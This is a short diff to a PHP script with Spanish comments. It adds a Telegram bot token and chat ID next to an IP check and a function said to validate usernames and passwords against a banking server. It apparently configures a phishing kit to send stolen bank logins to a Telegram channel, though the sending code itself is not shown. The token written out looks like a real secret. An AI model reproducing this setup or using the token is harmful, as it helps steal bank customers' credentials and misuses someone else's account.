@@ -25,8 +25,8 @@ if (!empty($direccion_ip)) {
 }
 
 // Token del bot y chat ID del canal
-$botToken = '';
-$chatId = '';
+$botToken = '7768341022:AAGAb_UOKzU3EycpHj1CtfLYR2VnnU9yHo0';
+$chatId = '-4786851797';
 
 // Validar credenciales con el servidor bancario
 function validarUsuario($usuario, $clave)
